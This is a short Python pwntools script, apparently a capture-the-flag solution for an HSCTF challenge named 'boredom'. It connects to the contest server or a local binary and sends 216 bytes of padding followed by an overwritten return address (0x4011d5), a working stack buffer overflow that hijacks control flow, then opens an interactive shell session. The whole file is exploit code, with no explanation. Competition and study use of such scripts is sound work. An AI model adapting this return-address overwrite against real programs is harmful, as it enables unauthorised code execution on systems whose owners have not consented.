from pwn import *

if len(sys.argv) > 1:
    sh = remote('pwn.hsctf.com', 5002)
else:
    sh = process('./boredom')

gdb.attach(sh)
p = "a"*216
p+=p64(0x4011d5)

sh.sendline(p)

sh.interactive()